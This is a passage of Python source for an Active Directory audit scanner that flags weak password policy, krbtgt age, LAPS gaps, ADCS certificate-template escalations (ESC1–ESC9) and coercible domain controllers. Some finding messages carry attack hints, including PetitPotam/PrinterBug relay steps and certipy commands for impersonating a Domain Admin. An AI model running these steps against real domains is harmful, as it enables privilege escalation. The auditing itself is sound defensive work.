        protected = {m["dn"] for members in self.d.priv_group_members.values()
                     for m in members}
        if self.d.krbtgt:
            protected.add(self.d.krbtgt.get("dn", ""))
        affected = []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            if get_int(a, "adminCount") != 1:
                continue
            if obj["dn"] in protected:
                continue
            affected.append(get_str(a, "sAMAccountName") or dn_base(obj["dn"]))
        if affected:
            self._add("P-AdminCountOrphan",
                      "Objects carry adminCount=1 but are not currently in a "
                      "protected group. They retain restrictive AdminSDHolder ACLs "
                      "and indicate former privilege — review and clear adminCount "
                      "(and reset inheritance) on legitimately-demoted accounts.",
                      affected)

    def _m_sidhistory_privileged(self):
        affected = []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            raw_vals = a.get("sIDHistory") or a.get("sidHistory") or []
            if not isinstance(raw_vals, list):
                raw_vals = [raw_vals]
            sam = get_str(a, "sAMAccountName")
            for v in raw_vals:
                s = v if (isinstance(v, str) and v.startswith("S-")) else sid_to_str(v)
                if not s or not s.startswith("S-"):
                    continue
                rid = None
                try:
                    rid = int(s.rsplit("-", 1)[1])
                except (ValueError, IndexError):
                    pass
                if (rid in self._PRIV_RIDS or rid == 500
                        or s in self._PRIV_BUILTIN):
                    label = self._PRIV_BUILTIN.get(s, f"RID {rid}")
                    affected.append(f"{sam} <- {s} ({label})")
        if affected:
            self._add("S-SIDHistoryPrivileged",
                      "Accounts carry a privileged/built-in SID in their SID "
                      "history. This is a classic stealth backdoor: the account "
                      "wields admin rights without being a visible group member. "
                      "Remove the SID history and rotate krbtgt twice.",
                      affected)

    # =========================================================================
    # ANOMALY CHECKS (A-)
    # =========================================================================

    def _check_anomaly(self):
        self._a_krbtgt()
        self._a_guest()
        self._a_pre_win2000()
        self._a_null_session_ldap()
        self._a_root_dse_anon()
        self._a_ds_heuristics()
        self._a_laps()
        self._a_min_pwd_len()
        self._a_reversible_pwd()
        self._a_lm_hash()
        self._a_protected_users_usage()
        self._a_dns_zones()
        self._a_not_enough_dc()
        self._a_ntfrs_sysvol()
        self._a_adcs_checks()
        self._a_member_everyone()
        self._a_bad_successor()
        self._a_dc_spooler_webclient()
        self._a_smart_card_rotation()
        self._a_admin_sd_holder()
        self._a_pwd_gpo()
        self._a_audit_powershell()

    def _a_krbtgt(self):
        k = self.d.krbtgt
        if not k:
            return
        pls = filetime_to_dt(get_int(k["attrs"], "pwdLastSet"))
        age = days_since(pls)
        if pls is None:
            self._add("A-Krbtgt",
                      "krbtgt password has NEVER been changed — "
                      "any Golden Ticket issued against the old hash is valid forever.",
                      ["krbtgt"])
        elif age is not None and age > 180:
            self._add("A-Krbtgt",
                      f"krbtgt password last changed {age} days ago (threshold: 180). "
                      "Old Kerberos Golden Tickets remain valid.",
                      [f"krbtgt (last changed {age} days ago)"])

    def _a_guest(self):
        g = self.d.guest
        if not g:
            return
        uac = get_int(g["attrs"], "userAccountControl")
        if not uac_has(uac, UAC_ACCOUNTDISABLE):
            self._add("A-Guest",
                      "The built-in Guest account is enabled. "
                      "Attackers can authenticate without credentials.",
                      ["Guest"])

    def _a_pre_win2000(self):
        pw = self.d.pre_win2000
        if not pw:
            return
        members = get_list(pw["attrs"], "member")
        if not members:
            return
        anon_sids  = {"S-1-5-7", "S-1-1-0"}   # Anonymous Logon, Everyone
        auth_users = "S-1-5-11"
        anon_found, auth_found, other = [], [], []
        for m in members:
            ml = m.lower()
            if "anonymous" in ml or "s-1-5-7" in ml:
                anon_found.append(m)
            elif "authenticated users" in ml or "s-1-5-11" in ml:
                auth_found.append(m)
            elif "everyone" in ml or "s-1-1-0" in ml:
                anon_found.append(m)
            else:
                other.append(m)
        if anon_found:
            self._add("A-PreWin2000Anonymous",
                      "Anonymous/Everyone is member of Pre-Windows 2000 Compatible Access "
                      "— unauthenticated LDAP enumeration may be possible.",
                      anon_found)
        if auth_found:
            self._add("A-PreWin2000AuthenticatedUsers",
                      "Authenticated Users is member of Pre-Windows 2000 Compatible Access "
                      "— any domain user can enumerate sensitive LDAP attributes.",
                      auth_found)
        if other:
            self._add("A-PreWin2000Other",
                      "Pre-Windows 2000 Compatible Access group has unexpected members.",
                      other)

    def _a_null_session_ldap(self):
        # An anonymous LDAP bind always succeeds at the protocol level in AD.
        # We only flag this if the anonymous session can actually *read* directory objects
        # (e.g., user/computer accounts) — that is a genuine misconfiguration.
        # Simply binding as anonymous and reading rootDSE is normal behavior.
        try:
            srv = Server(self.args.dc_ip, port=389, get_info=ALL, connect_timeout=5)
            tc  = Connection(srv, auto_bind=True)
            if not tc.bound:
                return
            # Try to search the domain root for any object — non-empty result = misconfigured
            base = self.d.base if self.d.base else ""
            tc.search(base, "(objectClass=user)",
                      ldap3.SUBTREE,
                      attributes=["sAMAccountName"],
                      size_limit=1)
            got_data = bool(tc.entries)
            tc.unbind()
            if got_data:
                self._add("A-NullSession",
                          f"Anonymous LDAP bind can enumerate domain objects on {self.args.dc_ip}:389. "
                          "This is a serious misconfiguration — unauthenticated enumeration of all "
                          "users, computers and groups is possible. "
                          "Restrict via dsHeuristics or block anonymous LDAP at the firewall.",
                          [f"{self.args.dc_ip}:389"])
        except Exception:
            pass

    def _a_root_dse_anon(self):
        # rootDSE is publicly readable on all AD servers by design (RFC 4512).
        # This is expected behavior, not a vulnerability; skip to avoid noise.
        pass

    def _a_ds_heuristics(self):
        h = self.d.ds_heuristics
        if not h:
            return
        # Position 7 (1-indexed) controls anonymous LDAP
        def pos(n):
            return h[n-1] if len(h) >= n else "0"
        if pos(7) == "2":
            self._add("A-DsHeuristicsAnonymous",
                      "dSHeuristics position 7 = '2': anonymous LDAP operations enabled.",
                      [f"dSHeuristics={h}"])
        if pos(3) == "1":
            self._add("A-DsHeuristicsAllowAnonNSPI",
                      "dSHeuristics position 3 = '1': anonymous NSPI access allowed.",
                      [f"dSHeuristics={h}"])
        # CVE-2021-42291: LDAPAddAutZVerifications=0 in msDS-Other-Settings means
        # the AD-add authorization hardening is explicitly disabled. A present,
        # non-zero value is the secure state, so only an explicit 0 is flagged.
        for kv in (self.d.ms_ds_other_settings or []):
            m = re.match(r"\s*LDAPAddAutZVerifications\s*=\s*(\d+)", kv)
            if m and int(m.group(1)) == 0:
                self._add("A-DsHeuristicsLDAPSecurity",
                          "CVE-2021-42291 LDAP add-authorization hardening is explicitly "
                          "disabled (LDAPAddAutZVerifications=0 in msDS-Other-Settings).",
                          [f"msDS-Other-Settings: {'; '.join(self.d.ms_ds_other_settings)[:100]}"])
                break

    def _a_laps(self):
        if not self.d.laps_installed:
            self._add("A-LAPS-Not-Installed",
                      "LAPS schema attribute (ms-Mcs-AdmPwd or msLAPS-Password) not found. "
                      "Local administrator passwords are not managed centrally.",
                      [])
            return
        # Check which computers have no LAPS expiration set (password not stored)
        no_laps = []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            # Skip DCs
            if uac_has(uac, UAC_SERVER_TRUST):
                continue
            has_exp = (get_str(comp["attrs"], "ms-Mcs-AdmPwdExpirationTime") or
                       get_str(comp["attrs"], "msLAPS-PasswordExpirationTime"))
            if not has_exp or has_exp == "0":
                no_laps.append(get_str(comp["attrs"], "dNSHostName") or
                               get_str(comp["attrs"], "sAMAccountName"))
        if len(no_laps) > 0:
            self._add("A-LAPS-Joined-Computers",
                      f"{len(no_laps)} enabled workstation/server accounts have no LAPS "
                      "password set (or LAPS never ran on them).",
                      no_laps[:20])

    def _a_min_pwd_len(self):
        if not self.d.domain_obj:
            return
        mpl = get_int(self.d.domain_obj["attrs"], "minPwdLength")
        if mpl < 8:
            self._add("A-MinPwdLen",
                      f"Domain minimum password length is {mpl} characters (recommended ≥ 8). "
                      "Weak passwords are allowed by policy.",
                      [f"minPwdLength={mpl}"])

    def _a_reversible_pwd(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ENCRYPTED_TEXT_PWD):
                if not uac_has(uac, UAC_ACCOUNTDISABLE):
                    affected.append(get_str(u["attrs"], "sAMAccountName"))
        if affected:
            self._add("A-ReversiblePwd",
                      f"{len(affected)} enabled user account(s) store passwords with "
                      "reversible encryption — equivalent to cleartext.",
                      affected[:30])

    def _a_lm_hash(self):
        if not self.d.domain_obj:
            return
        # Old DFL (pre-2003) implies LM-hash storage may still be active; flag it
        # so the "Do not store LAN Manager hash" GPO can be verified.
        if self.d.domain_level is not None and 0 <= self.d.domain_level < 2:
            self._add("A-LMHashAuthorized",
                      "Domain functional level suggests LM hash storage may be active. "
                      "Verify the 'Network security: Do not store LAN Manager hash' GPO.",
                      [f"Domain functional level: {FUNCTIONAL_LEVELS.get(self.d.domain_level)}"])

    def _a_protected_users_usage(self):
        pu = self.d.protected_users
        pu_members = set()
        if pu:
            for m in get_list(pu["attrs"], "member"):
                pu_members.add(m.lower())
        # Check if all domain admin members are in Protected Users
        da_members = self.d.priv_group_members.get("Domain Admins", [])
        not_protected = []
        for m in da_members:
            dn = m.get("dn", "").lower()
            if dn and dn not in pu_members:
                sam = get_str(m["attrs"], "sAMAccountName")
                uac = get_int(m["attrs"], "userAccountControl")
                if not uac_has(uac, UAC_ACCOUNTDISABLE):
                    not_protected.append(sam)
        if not_protected:
            self._add("A-ProtectedUsers",
                      f"{len(not_protected)} Domain Admin account(s) are not members of "
                      "Protected Users — they are susceptible to credential theft.",
                      not_protected[:20])

    def _a_dns_zones(self):
        """Flag DNS zones whose nTSecurityDescriptor grants CreateChild to
        Authenticated Users (default on AD-integrated zones — enables ADIDNS
        poisoning). Skipped when we cannot read the SD or no evidence exists.
        """
        if not HAS_IMPACKET_LDAP:
            return
        AU_SID  = "S-1-5-11"
        EV_SID  = "S-1-1-0"
        risky_zones: List[str] = []
        for z in self.d.dns_zones:
            zname = get_str(z["attrs"], "name") or z["dn"]
            # Re-fetch zone SD with the DACL flag (backend-agnostic — the old
            # direct ldap3 search did nothing on the Kerberos/impacket backend).
            try:
                sd_raw = self.d.conn.fetch_sd(z["dn"])
                if not sd_raw:
                    continue
                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_raw)
                dacl = sd["Dacl"]
                if not dacl:
                    continue
                for ace in dacl["Data"]:
                    sid = ace["Ace"]["Sid"].formatCanonical()
                    if sid not in (AU_SID, EV_SID):
                        continue
                    mask = ace["Ace"]["Mask"]["Mask"]
                    # CreateChild = 0x1; generic-mapped GenericAll = 0x10000000,
                    # GenericWrite = 0x40000000 (0xF01FF would match benign reads).
                    if mask & 0x1 or mask & 0x10000000 or mask & 0x40000000:
                        risky_zones.append(zname)
                        break
            except Exception:
                continue
        if risky_zones:
            self._add("A-DnsZoneAUCreateChild",
                      "DNS zone(s) grant CreateChild (or higher) to Authenticated Users / "
                      "Everyone — any domain user can register A/CNAME records (ADIDNS) and "
                      "stage Responder-style spoofing for wpad, file servers, etc.",
                      risky_zones)

    def _a_not_enough_dc(self):
        active_dcs = [d for d in self.d.dcs
                      if not uac_has(get_int(d["attrs"], "userAccountControl"),
                                     UAC_ACCOUNTDISABLE)]
        # 0 means DC enumeration failed (not a real single-DC domain) — skip to
        # avoid a false finding.
        if 0 < len(active_dcs) < 2:
            self._add("A-NotEnoughDC",
                      f"Only {len(active_dcs)} domain controller(s) found. "
                      "Single DC is a single point of failure.",
                      [get_str(d["attrs"], "dNSHostName") for d in active_dcs])

    def _a_ntfrs_sysvol(self):
        # Check msDS-NcType or FRS service registration
        frs_sets = self.d.conn.paged_search(
            self.d.cfg,
            "(objectClass=nTFRSReplicaSet)",
            ["name","distinguishedName"])
        if frs_sets:
            names = [get_str(f["attrs"], "name") for f in frs_sets]
            self._add("A-NTFRSOnSysvol",
                      "NTFRS replica sets found — SYSVOL replication may still use "
                      "deprecated FRS instead of DFSR. This is a security and stability risk.",
                      names)

    # EKUs that make a certificate useful for domain authentication (ESC1 prereq)
    _AUTH_EKUS = {
        "1.3.6.1.5.5.7.3.2",          # Client Authentication
        "1.3.6.1.4.1.311.20.2.2",     # Smart Card Logon
        "1.3.6.1.5.2.3.4",            # PKINIT Client Auth
        "2.5.29.37.0",                 # Any Purpose
    }
    _ANY_PURPOSE_OID       = "2.5.29.37.0"
    _CERT_REQUEST_AGENT    = "1.3.6.1.4.1.311.20.2.1"

    # msPKI-Certificate-Name-Flag bits
    _CT_ENROLLEE_SUPPLIES_SUBJECT = 0x00000001
    # msPKI-Enrollment-Flag bits
    _CT_PEND_ALL_REQUESTS = 0x00000002   # manager approval required

    def _a_adcs_checks(self):
        if self.args.no_adcs:
            return

        # ESC8: HTTP enrollment (relay-able)
        for svc in self.d.enrollment_svcs:
            host = get_str(svc["attrs"], "dNSHostName")
            if host and check_port(host, 80, timeout=3):
                self._add("A-CertEnrollHttp",
                          f"ADCS enrollment service '{get_str(svc['attrs'],'cn')}' on {host} "
                          "appears to accept HTTP (port 80 open). ESC8 NTLM relay to ADCS is "
                          "possible — use PetitPotam/PrinterBug to coerce DC auth and relay "
                          "to /certsrv/certfnsh.asp to obtain a DC certificate.",
                          [host])

        published = getattr(self.d, "_published_templates", set())

        for tmpl in self.d.cert_templates:
            cn         = get_str(tmpl["attrs"], "cn")
            name_flag  = get_int(tmpl["attrs"], "msPKI-Certificate-Name-Flag")
            enroll_flag= get_int(tmpl["attrs"], "msPKI-Enrollment-Flag")
            ra_sig     = get_int(tmpl["attrs"], "msPKI-RA-Signature")
            ekus       = get_list(tmpl["attrs"], "pKIExtendedKeyUsage")

            # Only check templates published to at least one CA
            if published and cn not in published:
                continue

            manager_approval = bool(enroll_flag & self._CT_PEND_ALL_REQUESTS)
            has_auth_eku     = bool(set(ekus) & self._AUTH_EKUS)
            has_any_eku      = self._ANY_PURPOSE_OID in ekus
            no_eku           = not ekus

            # Enrollment-based escalations (ESC1/2/3/9) are only attacker-reachable
            # if a broad / low-priv principal can actually enroll. When only Tier-0
            # (EA/DA) hold the Enroll right, reporting is a false positive (issue
            # #2). If the SD can't be parsed we still report, with a caveat.
            enrollers, enroll_parsed = self._template_low_priv_enrollers(tmpl)
            enroll_reachable = bool(enrollers) or not enroll_parsed
            if enrollers:
                enroll_note = " Low-priv enrollers: " + ", ".join(enrollers) + "."
            elif not enroll_parsed:
                enroll_note = " (Enrollment rights could not be verified — confirm who can enroll.)"
            else:
                enroll_note = ""

            # ESC1: enrollee supplies subject + auth EKU + no manager approval
            if (name_flag & self._CT_ENROLLEE_SUPPLIES_SUBJECT
                    and has_auth_eku
                    and not manager_approval
                    and enroll_reachable):
                ca_names = [get_str(s["attrs"],"cn") for s in self.d.enrollment_svcs
                            if cn in get_list(s["attrs"],"certificateTemplates")]
                self._add("A-CertTempCustomSubject",
                          f"ESC1: Template '{cn}' allows enrollee-supplied Subject/SAN "
                          f"with authentication EKU and no manager approval. Published on CA(s): "
                          f"{', '.join(ca_names) or 'unknown'}.{enroll_note} "
                          "Attack: request cert with arbitrary UPN (e.g., Domain Admin) and "
                          "use PKINIT to obtain a TGT. "
                          "certipy find -vulnerable / req -template <tmpl> -upn administrator@domain",
                          [cn] + ca_names)

            # ESC2: any purpose EKU (no EKU restriction) + no manager approval
            if (has_any_eku or no_eku) and not manager_approval and enroll_reachable:
                ca_names = [get_str(s["attrs"],"cn") for s in self.d.enrollment_svcs
                            if cn in get_list(s["attrs"],"certificateTemplates")]
                self._add("A-CertTempAnyPurpose",
                          f"ESC2: Template '{cn}' has Any Purpose EKU or no EKU restrictions "
                          f"and no manager approval. Published on: {', '.join(ca_names) or 'unknown'}.{enroll_note} "
                          "Can be used as an enrollment agent or to authenticate as any user.",
                          [cn])

            # ESC3: Certificate Request Agent EKU without RA signature
            if (self._CERT_REQUEST_AGENT in ekus and ra_sig == 0
                    and not manager_approval and enroll_reachable):
                ca_names = [get_str(s["attrs"],"cn") for s in self.d.enrollment_svcs
                            if cn in get_list(s["attrs"],"certificateTemplates")]
                self._add("A-CertTempAgent",
                          f"ESC3: Template '{cn}' has Certificate Request Agent EKU with no "
                          f"RA signature requirement. Published on: {', '.join(ca_names) or 'unknown'}.{enroll_note} "
                          "Allows enrolling on behalf of any user — combine with ESC2 template "
                          "to impersonate Domain Admin.",
                          [cn])

            # ESC4: a low-privileged principal can EDIT the template's ACL/config
            esc4 = self._esc4_template_writers(tmpl)
            if esc4:
                self._add("A-CertTemplateESC4",
                          f"ESC4: Template '{cn}' is writable by low-privileged "
                          f"principal(s): {', '.join(esc4)}. They can reconfigure it "
                          "into an ESC1 (enrollee-supplied SAN + auth EKU) and then "
                          "impersonate any user. certipy template -template "
                          f"{cn} ... to weaponize.",
                          [f"{cn} writable by {p}" for p in esc4])

            # ESC9: no security extension on an auth template (weak cert mapping)
            if (enroll_flag & self._CT_NO_SECURITY_EXTENSION) and has_auth_eku and enroll_reachable:
                self._add("A-CertTemplateESC9",
                          f"ESC9: Template '{cn}' sets CT_FLAG_NO_SECURITY_EXTENSION with an "
                          f"authentication EKU — the issued cert omits the SID security "
                          f"extension, so AD falls back to weak (UPN) mapping. With write access "
                          f"to a victim's userPrincipalName this allows authenticating as them.{enroll_note}",
                          [cn])

        # ESC7: low-privileged principal holds CA management rights
        for svc in self.d.enrollment_svcs:
            writers = self._esc7_ca_managers(svc)
            if writers:
                self._add("A-CertCAManageLowPriv",
                          f"ESC7: CA '{get_str(svc['attrs'],'cn')}' grants management rights "
                          f"(ManageCA / Manage Certificates) to: {', '.join(writers)}. They can "
                          "flip EDITF_ATTRIBUTESUBJECTALTNAME2 (→ESC6) or approve their own "
                          "request to mint a DA certificate. certipy ca -add-officer / -enable-template.",
                          [f"{get_str(svc['attrs'],'cn')}: {p}" for p in writers])

    # Access-mask bits that let a principal rewrite a template into ESC1.
    _ADS_GENERIC_ALL   = 0x10000000
    _ADS_GENERIC_WRITE = 0x40000000
    _ADS_WRITE_DACL    = 0x00040000
    _ADS_WRITE_OWNER   = 0x00080000
    _ADS_WRITE_PROP    = 0x00000020
    _ADS_CONTROL_ACCESS= 0x00000100          # DS-Control-Access (extended right / enroll)
    _CT_NO_SECURITY_EXTENSION = 0x00080000   # msPKI-Enrollment-Flag bit
    _CA_MANAGE_RIGHTS  = 0x00000003          # ManageCA (0x1) | ManageCertificates (0x2)
    # Extended-right GUIDs that grant certificate enrollment on a template.
    _ENROLL_GUIDS = {
        "0e10c968-78fb-11d2-90d4-00c04f79dc55",  # Certificate-Enrollment
        "a05b8cc2-17bc-4802-a710-e7c15ab866a2",  # Certificate-AutoEnrollment
    }

    def _esc7_ca_managers(self, svc) -> List[str]:
        """Low-privileged principals with CA management rights (ESC7)."""
        if not HAS_IMPACKET_LDAP:
            return []
        raw = svc["attrs"].get("nTSecurityDescriptor")
        if isinstance(raw, list):
            raw = raw[0] if raw else None
        if not isinstance(raw, (bytes, bytearray)):
            return []
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
        except Exception:
            return []
        broad = self._broad_low_priv_sids()
        out = []
        dacl = sd["Dacl"]
        if not dacl:
            return []
        for ace in dacl["Data"]:
            try:
                if ace["AceType"] not in (0x00, 0x05):
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"]); sid = ace["Ace"]["Sid"].formatCanonical()
            except Exception:
                continue
            if sid in broad and (mask & self._CA_MANAGE_RIGHTS):
                out.append(broad[sid])
        return _dedup_keep_order(out)

    def _broad_low_priv_sids(self) -> Dict[str, str]:
        """Well-known SIDs that represent 'any/most authenticated principals'."""
        if getattr(self, "_broad_sids_cache", None) is not None:
            return self._broad_sids_cache
        sids = {"S-1-1-0": "Everyone", "S-1-5-11": "Authenticated Users",
                "S-1-5-7": "Anonymous", "S-1-5-32-545": "Users"}  # BUILTIN\Users
        try:
            dsid = sid_to_str(self.d.domain_obj["attrs"].get("objectSid"))
            if isinstance(self.d.domain_obj["attrs"].get("objectSid"), list):
                dsid = sid_to_str(self.d.domain_obj["attrs"]["objectSid"][0])
            if dsid.startswith("S-1-5-21"):
                sids[f"{dsid}-513"] = "Domain Users"
                sids[f"{dsid}-515"] = "Domain Computers"
        except Exception:
            pass
        self._broad_sids_cache = sids
        return sids

    def _esc4_template_writers(self, tmpl: Dict) -> List[str]:
        if not HAS_IMPACKET_LDAP:
            return []
        raw = tmpl["attrs"].get("nTSecurityDescriptor")
        if isinstance(raw, list):
            raw = raw[0] if raw else None
        if not raw:
            return []
        if not isinstance(raw, (bytes, bytearray)):
            return []
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
        except Exception:
            return []
        broad = self._broad_low_priv_sids()
        dangerous = (self._ADS_GENERIC_ALL | self._ADS_GENERIC_WRITE
                     | self._ADS_WRITE_DACL | self._ADS_WRITE_OWNER
                     | self._ADS_WRITE_PROP)
        writers: List[str] = []
        dacl = sd["Dacl"]
        if not dacl:
            return []
        for ace in dacl["Data"]:
            try:
                if ace["AceType"] not in (0x00, 0x05):  # ALLOWED / ALLOWED_OBJECT
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sidstr = ace["Ace"]["Sid"].formatCanonical()
            except Exception:
                continue
            if sidstr in broad and (mask & dangerous):
                writers.append(broad[sidstr])
        return _dedup_keep_order(writers)

    def _template_low_priv_enrollers(self, tmpl: Dict) -> Tuple[List[str], bool]:
        """Which broad / low-privileged principals can ENROLL in this template.

        Returns (principals, parsed_ok). The ESC1/2/3/9 escalations all require a
        low-priv attacker to be able to enroll; if only Tier-0 (EA/DA) hold the
        Enroll right the template is not attacker-reachable and reporting it is a
        false positive (issue #2). parsed_ok is False when the security descriptor
        could not be read/parsed, so the caller can fall back to reporting with a
        caveat rather than silently dropping a possibly-real finding."""
        if not HAS_IMPACKET_LDAP:
            return [], False
        raw = tmpl["attrs"].get("nTSecurityDescriptor")
        if isinstance(raw, list):
            raw = raw[0] if raw else None
        if not isinstance(raw, (bytes, bytearray)):
            return [], False
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
        except Exception:
            return [], False
        broad = self._broad_low_priv_sids()
        dacl = sd["Dacl"]
        if not dacl:
            return [], True
        out: List[str] = []
        for ace in dacl["Data"]:
            try:
                if ace["AceType"] not in (0x00, 0x05):  # ALLOWED / ALLOWED_OBJECT
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sidstr = ace["Ace"]["Sid"].formatCanonical()
            except Exception:
                continue
            if sidstr not in broad:
                continue
            # GenericAll always confers enrollment.
            if mask & self._ADS_GENERIC_ALL:
                out.append(broad[sidstr]); continue
            # Control-access (extended right). For object ACEs it only grants
            # enroll when the ObjectType is the Enroll/AutoEnroll GUID (or absent,
            # which means "all extended rights" and therefore includes enroll).
            if mask & self._ADS_CONTROL_ACCESS:
                ot = _ace_object_type(ace["Ace"]) if ace["AceType"] == 0x05 else b""
                if not ot or len(ot) != 16:
                    out.append(broad[sidstr]); continue
                try:
                    guid = _guid_from_bytes(bytes(ot)).strip("{}").lower()
                except Exception:
                    guid = ""
                if guid in self._ENROLL_GUIDS:
                    out.append(broad[sidstr])
        return _dedup_keep_order(out), True

    def _a_member_everyone(self):
        everyone_patterns = ["everyone","s-1-1-0","authenticated users",
                             "s-1-5-11","anonymous","s-1-5-7"]
        for gname in self.PRIV_GROUPS_SENSITIVE:
            g = self.d.groups.get(gname.lower())
            if not g:
                continue
            for m in get_list(g["attrs"], "member"):
                ml = m.lower()
                if any(p in ml for p in everyone_patterns):
                    self._add("A-MembershipEveryone",
                              f"'{m}' is a member of privileged group '{gname}'. "
                              "Any domain user (or anonymous) inherits these privileges.",
                              [f"{m} -> {gname}"])

    PRIV_GROUPS_SENSITIVE = [
        "Domain Admins","Schema Admins","Enterprise Admins","Administrators",
        "Group Policy Creator Owners","Backup Operators","Account Operators",
    ]

    def _a_bad_successor(self):
        # Check for dMSA objects with msDS-DelegatedManagedServiceAccountPrecededByLink
        # indicating a bad-successor configuration
        dmsas = self.d.conn.paged_search(
            self.d.base,
            "(objectClass=msDS-DelegatedManagedServiceAccount)",
            ["cn","msDS-ManagedAccountPrecededByLink",
             "msDS-DelegatedManagedServiceAccountPrecededByLink",
             "distinguishedName"])
        for dmsa in dmsas:
            link = get_str(dmsa["attrs"],
                           "msDS-DelegatedManagedServiceAccountPrecededByLink") or \
                   get_str(dmsa["attrs"], "msDS-ManagedAccountPrecededByLink")
            if link:
                self._add("A-BadSuccessor",
                          f"dMSA '{dmsa['dn']}' has a predecessor link to '{link}'. "
                          "An attacker with delegation rights can extract the predecessor's "
                          "password hash or forge memberships.",
                          [dmsa["dn"]])

    def _a_dc_spooler_webclient(self):
        """Probe DC TCP/445 + RPC endpoint mapper for spoolsv. We only emit a
        finding when we can actively confirm an exploitable surface — no
        more 'cannot determine via LDAP' boilerplate.
        """
        if not HAS_IMPACKET_SMB:
            return
        try:
            from impacket.dcerpc.v5 import transport, epm  # noqa: F401
        except ImportError:
            return
        # MS-RPRN UUID (Print System Remote Protocol)
        RPRN_UUID = ('12345678-1234-ABCD-EF00-0123456789AB', '1.0')
        coercible: List[str] = []
        for dc in self.d.dcs[:8]:
            host = get_str(dc["attrs"], "dNSHostName") or \
                   get_str(dc["attrs"], "sAMAccountName")
            if not host:
                continue
            if not check_port(host, 445, timeout=3):
                continue
            try:
                strbind = epm.hept_map(host,
                                       RPRN_UUID[0],
                                       protocol="ncacn_ip_tcp")
                if strbind:
                    coercible.append(host)
            except Exception:
                continue
        if coercible:
            self._add("A-DC-Coerce",
                      "Print System Remote Protocol (MS-RPRN / spoolsv) is reachable on the "
                      "domain controller(s). Combined with NTLM relay this enables PrinterBug / "
                      "PetitPotam-style coercion to mint a DC certificate or relay to LDAPS.",
                      coercible)

    def _a_smart_card_rotation(self):
        # msDS-ExpirePasswordsOnSmartCardOnlyAccounts should be set
        if self.d.domain_obj:
            attrs = self.d.domain_obj["attrs"]
            flag_raw = attrs.get("msDS-ExpirePasswordsOnSmartCardOnlyAccounts")
            # Attribute may not exist on older domains
            if flag_raw is not None and str(flag_raw).upper() not in ("TRUE","1"):
                self._add("A-SmartCardPwdRotation",
                          "msDS-ExpirePasswordsOnSmartCardOnlyAccounts is not set. "
                          "Smart-card-only accounts' NT hashes never rotate.",
                          [])

    def _a_admin_sd_holder(self):
        # Check AdminSDHolder ACL for dangerous principals
        # Full ACL parse is complex; we flag that it exists for review
        if self.d.admin_sd_holder:
            # Check if there are non-admin users with high priv group membership
            # that differ from AdminSDHolder ACL - partial check via adminCount
            ac1_users = [u for u in self.d.users
                         if get_int(u["attrs"], "adminCount") == 1]
            # Users with adminCount=1 but not in any known priv group = orphaned
            known_priv_dns = set()
            for grp_members in self.d.priv_group_members.values():
                for m in grp_members:
                    known_priv_dns.add(m.get("dn", "").lower())
            orphaned = []
            for u in ac1_users:
                if u["dn"].lower() not in known_priv_dns:
                    sam = get_str(u["attrs"], "sAMAccountName")
                    uac = get_int(u["attrs"], "userAccountControl")
                    if not uac_has(uac, UAC_ACCOUNTDISABLE):
                        orphaned.append(sam)
            if orphaned:
                self._add("A-AdminSDHolder",
                          f"{len(orphaned)} account(s) have adminCount=1 but are not members "
                          "of any known privileged group — possible orphaned AdminSDHolder entries.",
                          orphaned[:20])

    def _a_pwd_gpo(self):
        if not self.d.domain_obj:
            return
        attrs = self.d.domain_obj["attrs"]
        props = get_int(attrs, "pwdProperties")
        hist  = get_int(attrs, "pwdHistoryLength")
        # pwdProperties bit 0 (0x1) = DOMAIN_PASSWORD_COMPLEX
        if not (props & 0x1):
            self._add("A-PwdComplexity",
                      "Domain default password policy does not require complexity "
                      f"(pwdProperties=0x{props:x}; DOMAIN_PASSWORD_COMPLEX bit clear).",
                      [f"pwdProperties=0x{props:x}"])
        if hist > 0 and hist < 24:
            self._add("A-PwdHistory",
                      f"Domain password history length is {hist} entries "
                      "(recommended ≥ 24).",
                      [f"pwdHistoryLength={hist}"])
        # maxPwdAge is stored as negative 100-ns FILETIME. 0 or 0x8000000000000000 = never expire.
        mpa_raw = attrs.get("maxPwdAge")
        try:
            mpa_int = int(mpa_raw[0] if isinstance(mpa_raw, list) else mpa_raw)
        except (TypeError, ValueError):
            mpa_int = 0
        # Convert to days. Anything == 0 or == -0x8000000000000000 -> never
        if mpa_int == 0 or mpa_int == -0x8000000000000000:
            self._add("A-PwdMaxAge",
                      "Domain maxPwdAge is set to NEVER — credentials never expire by policy.",
                      ["maxPwdAge = never"])
        else:
            days = abs(mpa_int) / (10_000_000 * 60 * 60 * 24)
            if days > 365:
                self._add("A-PwdMaxAge",
                          f"Domain password maximum age is {days:.0f} days "
                          "(recommended ≤ 365).",
                          [f"maxPwdAge ≈ {days:.0f} days"])

    def _a_audit_powershell(self):
        """No-op: the LDAP-only path cannot read Registry.pol. The matching
        GPO-aware check (_a_powershell_logging_gpo) runs during SYSVOL pass
        and emits a fact-based finding when evidence is present."""
        return

    # =========================================================================
    # PRIVILEGED CHECKS (P-)
    # =========================================================================

    def _check_privileged(self):
        self._p_admin_count()
        self._p_admin_pwd_age()
        self._p_inactive_admins()
        self._p_kerberoasting_priv()
        self._p_unconstrained_delegation()
        self._p_service_domain_admin()
        self._p_schema_admin()
        self._p_recycle_bin()
        self._p_protected_users_priv()
        self._p_rodc_checks()
        self._p_dns_admin()
        self._p_exchange_priv_esc()
        self._p_delegations()
        self._p_unprotected_ous()

    def _priv_last_logon_map(self) -> Dict[str, int]:
        """Roadmap item 7: max non-replicated lastLogon per privileged account
        across ALL DCs. lastLogonTimestamp replicates but lags up to ~14 days, so
        an admin who only ever logs on to one DC can look stale/never-logged-on.
        Only runs under --accurate-logon (extra per-DC binds). Cached."""
        if getattr(self, "_pll_cache", None) is not None:
            return self._pll_cache
        cache: Dict[str, int] = {}
        if not getattr(self.args, "accurate_logon", False):
